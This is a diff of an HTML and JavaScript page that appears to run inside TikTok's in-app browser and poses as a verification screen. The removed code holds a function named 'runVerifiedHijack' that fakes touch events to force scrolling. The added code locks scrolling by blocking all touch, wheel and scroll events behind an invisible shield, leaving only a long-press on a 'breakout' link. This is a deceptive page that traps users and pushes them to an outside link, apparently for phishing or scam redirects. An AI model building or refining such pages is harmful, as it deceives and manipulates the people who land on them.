@@ -8,8 +8,11 @@
             margin: 0; padding: 0; background: #ffffff; 
             height: 300vh; overscroll-behavior-y: none; 
             -webkit-font-smoothing: antialiased;
+            /* Smooth snap for fragment jump */
+            scroll-behavior: smooth;
         }
         
+        /* The gap that stays behind the TikTok UI */
         #top-block { height: 600px; background: #ffffff; width: 100%; } 
 
         #main-content { 
@@ -17,68 +20,27 @@
             text-align: center; 
             font-family: "Proxima Nova", "Inter", sans-serif;
             padding: 0 30px; 
-            margin-top: 120px;
+            /* Reduced margin-top because #top-block handles the offset */
+            margin-top: 50px; 
         }
 
-        .verification-icon {
-            width: 60px; height: 60px; margin-bottom: 15px;
-        }
-
-        .header {
-            color: #161823; font-size: 22px; font-weight: 700;
-            margin-bottom: 10px;
-        }
-
-        .subtext {
-            color: #8A8B91; font-size: 16px; line-height: 1.5;
-            margin-bottom: 25px; max-width: 310px;
-            margin-left: auto; margin-right: auto;
-        }
-
-        .instruction-list {
-            display: inline-block;
-            text-align: left;
-            color: #8A8B91;
-            font-size: 16px;
-            margin-bottom: 55px; 
-            padding-left: 20px;
-            line-height: 1.6;
-            max-width: 330px;
-        }
-
-        .instruction-list li {
-            margin-bottom: 8px;
-        }
-
-        #link-area {
-            margin-top: 20px;
-        }
-
-        #breakout-link {
-            color: #0049f6; text-decoration: underline;
-            font-size: 17px; font-weight: 500;
-            display: inline-block; 
-            z-index: 10000;
-            position: relative; 
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        #footer-ref {
-            margin-top: 8px; 
-            color: #D1D1D3;
-            font-size: 10px; 
-            font-family: monospace;
-            letter-spacing: 0.5px;
-        }
-
+        .verification-icon { width: 60px; height: 60px; margin-bottom: 15px; }
+        .header { color: #161823; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 25px; max-width: 310px; margin-left: auto; margin-right: auto; }
+        .instruction-list { display: inline-block; text-align: left; color: #8A8B91; font-size: 16px; margin-bottom: 55px; padding-left: 20px; line-height: 1.6; max-width: 330px; }
+        .instruction-list li { margin-bottom: 8px; }
+        #link-area { margin-top: 20px; }
+        #breakout-link { color: #0049f6; text-decoration: underline; font-size: 17px; font-weight: 500; display: inline-block; z-index: 10000; position: relative; -webkit-tap-highlight-color: transparent; }
+        #footer-ref { margin-top: 8px; color: #D1D1D3; font-size: 10px; font-family: monospace; letter-spacing: 0.5px; }
         #shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 5000; pointer-events: none; }
     </style>
 </head>
 <body>
     <div id="shield"></div>
+    
     <div id="top-block"></div>
 
-    <div id="main-content">
+    <div id="main-content" id="start">
         <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
             <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
             <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
@@ -101,45 +63,22 @@
     </div>
 
 <script>
-        function createTouchEvent(type, y) {
-            return new TouchEvent(type, {
-                bubbles: true, cancelable: true,
-                touches: [new Touch({ identifier: Date.now(), target: document.body, clientY: y, screenY: y, pageY: y })]
-            });
-        }
-
-        async function runVerifiedHijack() {
-            const startY = 900, endY = 100, steps = 20, stepDelay = 10; // Slightly faster delay
-            document.body.dispatchEvent(createTouchEvent('touchstart', startY));
-            
-            for (let i = 0; i <= steps; i++) {
-                const currentY = startY - ((startY - endY) * (i / steps));
-                document.body.dispatchEvent(createTouchEvent('touchmove', currentY));
-                
-                // Force the scroll position
-                window.scrollTo(0, 600); 
-                
-                await new Promise(r => setTimeout(r, stepDelay));
-            }
-            
-            document.body.dispatchEvent(createTouchEvent('touchend', endY));
-            
-            // IMMEDIATE LOCK
-            engageLock();
-        }
-
         function engageLock() {
-            // Force scroll to bottom one last time to be sure
-            window.scrollTo(0, 600);
+            // Anchor point
+            const targetPos = document.getElementById('top-block').offsetHeight;
+            window.scrollTo(0, targetPos);
             
             document.getElementById('shield').style.display = 'block';
-            const link = document.getElementById('breakout-link');
             
-            // Prevent all default scrolling behaviors
             const prevent = (e) => { 
-                // Allow touchstart only on the link so they can long-press
-                if (e.target.id === 'breakout-link' && e.type === 'touchstart') return;
+                // Allow the long-press on the link
+                if (e.target.id === 'breakout-link') return;
                 
+                // If the user tries to scroll above the content, snap back down
+                if (window.pageYOffset < targetPos) {
+                    window.scrollTo(0, targetPos);
+                }
+
                 if (e.cancelable) e.preventDefault(); 
                 e.stopPropagation(); 
             };
@@ -147,14 +86,15 @@
             ['touchstart', 'touchmove', 'touchend', 'wheel', 'scroll'].forEach(ev => {
                 window.addEventListener(ev, prevent, { passive: false, capture: true });
             });
-
-            // Specific link bypass for long-press
-            link.addEventListener('click', (e) => e.preventDefault(), { capture: true });
         }
 
-        window.onload = () => { setTimeout(runVerifiedHijack, 50); }; // Shorter initial delay
+        window.onload = () => { 
+            // If they didn't use the #start link, force it
+            if(!window.location.hash) {
+                window.location.hash = "start";
+            }
+            setTimeout(engageLock, 100); 
+        };
     </script>
 </body>
 </html>
-
-
